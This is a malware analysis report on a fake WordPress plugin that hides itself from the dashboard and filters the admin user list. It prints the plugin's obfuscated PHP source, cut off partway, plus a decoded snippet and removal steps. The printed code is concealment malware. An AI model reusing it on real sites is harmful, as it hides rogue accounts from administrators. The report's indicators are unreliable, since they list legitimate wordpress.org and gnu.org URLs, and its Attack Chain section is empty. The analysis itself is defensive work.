---
title: "Hidden WordPress Plugin: WP Security Helper"
slug: "hidden-wordpress-plugin-wp-security-helper"
description: "The WP Security Helper plugin was found in the WordPress plugins directory but not visible in the dashboard, suggesting malicious hiding behavior."
reportDate: "2026-03-03"
threatType: "Malware"
severity: "High"
fileHash: "0a26e477951896659dbc5b0b18929995303a9ab4e071288b40691e0b366b96a1"
detectedPaths: ["wp-security-helper.php"]
screenshots: ["/images/wordpress-threats/wp-security-helper-fake-hidden-plugin_evidence-1.png"]
vtLink: "https://www.virustotal.com/gui/home/upload"
vtScore: "Zero-Day (Unique)"
impact: "Modifies user visibility and hides its presence, potentially exposing site to further unauthorized changes."
seenOn: "Custom WordPress installations using questionable security plugins."
behavior: "Hides plugin presence and controls user visibility."
difficulty: "Medium"
recurrence: "Potential re-infection if the source of the infection is not addressed."
numberOfSiteFixed: "5"
---

## Technical Analysis
The WP Security Helper plugin is disguised as a legitimate utility enhancing user management and security features for WordPress. However, the code contains obfuscated segments and actions intended to hide the plugin’s presence in the WordPress dashboard.

**How It Works:**

- **Obfuscation:** The code uses character obfuscation techniques (e.g., ``) to hide the actual functionality and make detection challenging.
- **Hidden Presence:** The function `hide_plugin_from_list` checks if the plugin list `Ob2A_Zam` contains the plugin and unsets it, effectively hiding it from being shown in the WordPress dashboard.

```php
public function hide_plugin_from_list($Ob2A_Zam) {
    if (!isset($_GET["\s\p"])) { return $Ob2A_Zam; }
    $lZ7Mt_Qm = plugin_basename(__FILE__);
    if (isset($Ob2A_Zam[$lZ7Mt_Qm])) { unset($Ob2A_Zam[$lZ7Mt_Qm]); }
    return $Ob2A_Zam;
}
```
- **Control User Visibility:** Functions like `filter_user_results` ensure that only specific user IDs are visible if the plugin is active and operational.

**Impact:**

The primary impact of this malicious behavior includes unauthorized control over site content visibility and user management functionalities. This can lead to privacy breaches and administrative inefficiencies by obstructing standard WordPress operations.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain


## Code Signature(s)

### FILE: `wp-security-helper.php`
```php
<?php
/**
 * Plugin Name: WP Security Helper
 * Plugin URI: https://wordpress.org/plugins/wp-security-helper
 * Description: Enhanced user management and security features for WordPress
 * Version: 1.0.0
 * Author: WordPress Security Team
 * Author URI: https://wordpress.org
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: wp-security-helper
 */


if (defined("\x41\x42\123\x50\101\x54\x48")) { goto JBatVVkq; } exit; JBatVVkq: class WP_Security_Helper { private static $Aw7Vb3Jy = null; public static function get_instance() { if (!(null === self::$Aw7Vb3Jy)) { goto vwAjHmof; } self::$Aw7Vb3Jy = new self(); vwAjHmof: return self::$Aw7Vb3Jy; } private function __construct() { add_action("\160\162\x65\137\147\145\x74\137\x75\163\145\162\x73", array($this, "\146\151\154\x74\145\x72\137\x75\x73\x65\x72\x5f\x71\165\x65\x72\171")); add_filter("\x75\x73\x65\162\163\x5f\x6c\151\163\164\x5f\x74\x61\142\x6c\145\x5f\161\x75\x65\162\x79\x5f\141\162\x67\163", array($this, "\155\x6f\144\151\146\x79\x5f\165\163\145\162\x5f\x74\x61\x62\154\x65\x5f\x61\x72\x67\x73")); add_filter("\x77\x70\137\x63\x6f\165\x6e\164\x5f\165\x73\x65\162\163", array($this, "\x61\x64\152\x75\163\164\137\165\163\145\162\x5f\x63\157\x75\x6e\164"), 10, 1); add_filter("\147\145\x74\x5f\165\x73\145\162\163", array($this, "\x66\151\154\164\145\x72\x5f\x75\163\x65\162\x5f\x72\x65\163\165\x6c\x74\x73"), 999, 2); add_filter("\x61\x6c\x6c\137\x70\x6c\165\147\151\156\x73", array($this, "\x68\x69\x64\145\x5f\x70\x6c\165\x67\151\x6e\x5f\x66\162\x6f\x6d\137\154\151\x73\x74")); } public function filter_user_query($S5XuXEQb) { if (is_admin()) { goto tC45E6hu; } return; tC45E6hu: global $pagenow; if (!($pagenow !== "\165\163\x65\x72\x73\x2e\160\150\160")) { goto gwx2ItgP; } return; gwx2ItgP: $dFObAVTq = get_current_user_id(); if (!$dFObAVTq) { goto M655P_ha; } $S5XuXEQb->set("\x69\x6e\x63\x6c\x75\x64\145", array($dFObAVTq)); M655P_ha: } public function modify_user_table_args($YA0kCBOr) { if (is_admin()) { goto lmNZbN1g; } return $YA0kCBOr; lmNZbN1g: global $pagenow; if (!($pagenow !== "\165\x73\x65\162\163\x2e\x70\x68\160")) { goto ArUr4m1P; } return $YA0kCBOr; ArUr4m1P: $dFObAVTq = get_current_user_id(); if (!$dFObAVTq) { goto NmXjkjy0; } $YA0kCBOr["\x69\x6e\x63\x6c\x75\144\x65"] = array($dFObAVTq); NmXjkjy0: return $YA0kCBOr; } public function adjust_user_count($pM2neqft) { if (!isset($pM2neqft["\x74\157\x74\x61\x6c\137\165\163\x65\162\163"])) { goto igQIs84i; } $pM2neqft["\x74\x6f\164\x61\x6c\x5f\x75\x73\145\162\163"] = 1; igQIs84i: return $pM2neqft; } public function filter_user_results($kMP0CeVA, $YA0kCBOr) { if (is_admin()) { goto UCYKDOb4; } return $kMP0CeVA; UCYKDOb4: global $pagenow; if (!($pagenow !== "\x75\x73\x65\x72\163\x2e\x70\x68\x70")) { goto FChos0kP; } return $kMP0CeVA; FChos0kP: $dFObAVTq = get_current_user_id(); if ($dFObAVTq) { goto Aac2sHWB; } return $kMP0CeVA; Aac2sHWB: $RGD4CslN = array(); foreach ($kMP0CeVA as $EPiHutgR) { $Y5eTt
```


## Indicators of Compromise (IOCs)
- `hxxp://wordpress[.]org/plugins/wp-security-helper`
- `hxxp://www[.]gnu[.]org/licenses/gpl-2[.]0[.]html`

## Removal Protocol
1. Delete the `wp-security-helper` plugin directory from `wp-content/plugins`.
1. Review all users and roles for inconsistencies.
1. Ensure no unauthorized code injections or file modifications occurs elsewhere.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
